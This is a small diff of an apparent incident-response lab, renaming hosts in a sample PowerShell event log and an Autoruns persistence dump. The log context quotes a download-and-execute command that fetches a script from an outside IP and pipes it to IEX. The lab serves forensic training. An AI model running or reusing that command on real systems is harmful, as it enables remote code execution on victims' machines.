@@ -225,7 +225,7 @@ You open a PowerShell terminal on your management workstation to de-obfuscate th
       "EventID": 4104,
       "TimeCreated": { "SystemTime": "2026-10-22T10:17:42.184912Z" },
       "Execution": { "ProcessID": 6412 },
-      "Computer": "KEN-SALES-14.portland-ops.local"
+      "Computer": "KEN-SALES-14.harrowmere.local"
     },
     "EventData": {
       "ScriptBlockText": "$s=New-Object Net.WebClient;$s.DownloadString('http://185.22.112.14:8080/update.ps1') | IEX",
@@ -277,7 +277,7 @@ To inspect the persistence mechanism, you examine the pre-recorded Autoruns log 
 ```text
 ================================================================================
 Sysinternals Autoruns Command-Line Dump (autorunsc.exe -a r -c)
-Host: MAYA-W11.portland-ops.local
+Host: MAYA-W11.harrowmere.local
 ================================================================================
 Entry Location: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 Entry:         OptimizeRAM
